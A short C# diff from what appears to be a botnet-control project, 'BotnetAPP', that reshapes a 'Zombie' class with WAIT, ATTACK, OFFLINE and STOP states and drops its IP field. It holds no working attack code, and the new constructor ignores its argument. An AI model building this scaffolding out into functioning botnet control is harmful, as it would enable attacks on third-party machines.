@@ -6,26 +6,20 @@ using BotnetAPP.Shared;
 
 
 namespace BotnetAPP.Shared {
+    public class Zombie {
 
-    public enum Action {
-        ISWAITING,
-        ISATTACKING,
-        ISOFFLINE,
+        public enum Action {
+        WAIT,
+        ATTACK,
+        OFFLINE,
+        STOP, 
     }
 
-
-    public class Zombie {
-        private IPAddress _ip {get; set;}
         private Action _action {get; set;}
         private Order _ordre {get; set;}
 
-        public String IP {
-            get {
-                return _ip.ToString() ; 
-            }
-        }
 
-        public String Action {
+        public String GetAction {
             get {
                 return Enum.GetName(_action) ; 
             }
@@ -33,9 +27,8 @@ namespace BotnetAPP.Shared {
 
         public Zombie() {}
 
-        public Zombie(string ip, Action action ) {
-            _ip = IPAddress.Parse(ip) ;
-            _action = action ; 
+        public Zombie(Action action ) {
+             
         }
     }
 }
